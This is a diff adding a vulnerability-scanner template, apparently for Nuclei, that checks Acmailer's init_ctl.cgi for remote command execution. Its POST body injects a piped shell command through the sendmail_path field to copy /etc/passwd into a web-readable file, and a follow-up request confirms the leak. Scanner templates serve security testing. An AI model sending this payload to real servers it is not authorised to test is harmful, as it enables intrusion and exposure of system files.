@@ -1,0 +1,45 @@
+id: acmailer-init-ctl-cgi-rce
+info:
+  name: Acmailer init_ctl.cgi Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    This template detects a remote command execution vulnerability in the Acmailer init_ctl.cgi endpoint, allowing attackers to execute arbitrary commands on the server.
+
+variables:
+  t1: "{{rand_base(5)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: "1"
+    method: POST
+    path:
+      - "{{BaseURL}}/init_ctl.cgi"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=|cat /etc/passwd >{{t1}}.txt | bash&homeurl=http://&mypath=e
+    matchers:
+      - type: status
+        status:
+          - 302
+
+  - id: "2"
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        words:
+          - "<"
+        negative: true
